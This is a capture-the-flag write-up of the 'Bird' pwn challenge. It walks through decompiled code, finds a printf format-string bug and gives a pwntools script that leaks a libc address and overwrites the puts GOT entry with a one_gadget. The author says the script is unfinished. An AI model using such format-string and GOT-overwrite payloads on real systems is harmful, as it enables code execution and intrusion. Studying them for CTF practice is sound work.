# Bird

```
score: 366
solved: xx/42
difficulty: easy
tags: pwn, fmt
```

## Problem
```
Fly high my little friend. Ohh you're caged? My bad. Sorry. The server is running on Ubuntu 18.04.

Connect at bird.ctf.intigriti.io 7777
Download link: bird
Download link: libc.so.6
Flag format: 1337UP{}
Created by Sebastian Stohr
```

Attached: [bird](https://downloads.ctf.intigriti.io/1337UPLIVECTF2022-894ff411-aff8-453c-87b1-20ea939a7b6c/bird/8255f049-bdde-4629-a2bc-d4ecd7021dc1/bird) and [libc.so.6](https://downloads.ctf.intigriti.io/1337UPLIVECTF2022-894ff411-aff8-453c-87b1-20ea939a7b6c/bird/8255f049-bdde-4629-a2bc-d4ecd7021dc1/libc.so.6)

## Got the flag
After download bin file and open with `ghidra` we have
```c
undefined8 main(void)

{
  banner();
  cage();
  restart();
  puts("\n[\x1b[32m+\x1b[0m] Exiting.");
  return 0;
}
```
the `restart` function will call `cage` function again. Let examine the `cage` function. \
After rename some variables, we have some interesting things:
```c
void cage(void)

{
  char cVar1;
  size_t LEN_BIRD_NAME;
  char *pcVar2;
  long in_FS_OFFSET;
  
  ...
  if ((int)LEN_BIRD_NAME < 65) {
  
  ...
  
  }
  else{
  
  ...
      for (count = 0; (int)count < 0x42; count = count + 1) {
      *(byte *)((long)&local_168 + (long)(int)count) =
           *(byte *)((long)&local_168 + (long)(int)count) ^ 0x77;
    }
    local_1ad = '\0';
    for (count = 0; (int)count < 0x42; count = count + 1) {
      if ((count & 1) == 0) {
        local_1ad = *(char *)((long)&local_168 + (long)(int)count);
      }
      else {
        cVar1 = hex_to_ascii((int)local_1ad,(int)*(char *)((long)&local_168 + (long)(int)count));
        local_198[local_1a8] = cVar1;
        local_1a8 = local_1a8 + 1;
      }
    }
  ...
  
    printf("\n[\x1b[32m+\x1b[0m] The bird is singing: ");
    printf(BIRD_NAME);
  }
  ...
}
```

The `printf(BIRD_NAME)` trigger `format-string` vulnerability. \
The strategy :
1. leak address of libc in stack by injecting `$?%llx` to show `? - 5` index of stack frame _**(because `x64` get `rdi, rsi, rdx, rcx, r8, r9` as arguments first)**_. 
2. Override `GOT` by putting address of `GOT_puts` to input and override it with `%n` option of `printf`

Moreover, the program have sh*t thing (something combine for and loop in above...) to check input before trigger vulnerbility but I don't care about it. I choice the way to try and try again to reach the case which pass it.

Our solver:
**Note that my solver has not completed, need fix to override byte by byte of GOT address at the end. You can search it in youtube of Liveoverflow**
```py
#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./bird_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.DB:
        r = process([exe.path])
        gdb.attach(r,gdbscript='''
        init-gef\n
        b main\n
        b *0x00400b56\n
        ''')
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    # leak heap address
    # 35 -> heap
    # 26 -> string input
    one_gadgets = [0x4f3d5,0x4f432,0x10a41c]
    gad = one_gadgets[1]

    payload = b"%35$llx "
    payload = payload.ljust(0x42,b"A")
    payload += b"\n"
    time.sleep(2)
    r.sendafter(b"bird:", payload)
    log.info("GET DATA...")
    r.recvuntil(b"singing: ")
    leak = int(r.recvuntil(b"Did")[:-3][0:12],16)
    base_libc = leak - 0x8b28d
    log.info(hex(base_libc))
    libc.address = base_libc
    
    # trigger fmtstring bug again
    r.sendafter(b"(y/n) ",b"n\n")
    payload = b""
    payload += p64(exe.got["puts"]) 
    payload += "%{}x".format(gad+base_libc - len(payload)).encode()
    payload += b"%26$n"
    r.sendafter(b"bird:", payload)


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```